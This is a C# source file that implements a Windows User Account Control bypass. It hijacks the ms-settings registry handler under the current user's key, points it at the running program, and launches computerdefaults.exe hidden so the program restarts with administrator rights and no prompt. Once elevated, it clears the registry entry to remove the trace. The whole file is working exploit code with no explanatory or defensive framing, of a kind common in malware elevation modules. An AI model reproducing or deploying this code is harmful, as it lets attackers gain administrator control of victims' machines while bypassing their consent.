using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Principal;

public class Bypass
{
    public static void UAC()
    {
        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        {
            Modify("Classes");
            Modify("Classes\\ms-settings");
            Modify("Classes\\ms-settings\\shell");
            Modify("Classes\\ms-settings\\shell\\open");

            RegistryKey registryKey = Modify("Classes\\ms-settings\\shell\\open\\command");
            string cpath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            registryKey.SetValue("", cpath, RegistryValueKind.String);
            registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
            registryKey.Close();

            try
            {
                Process.Start(new ProcessStartInfo
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    FileName = "cmd.exe",
                    Arguments = "/c start computerdefaults.exe"
                });
            }
            catch
            {

            }

            Process.GetCurrentProcess().Kill();
        }
        else
        {
            RegistryKey registryKey2 = Modify("Classes\\ms-settings\\shell\\open\\command");
            registryKey2.SetValue("", "", RegistryValueKind.String);
        }
    }

    public static RegistryKey Modify(string x)
    {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);

        if (!CheckSubKey(registryKey))
        {
            registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
        }

        return registryKey;
    }

    public static bool CheckSubKey(RegistryKey k)
    {
        bool flag = k == null;
        return !flag;
    }
}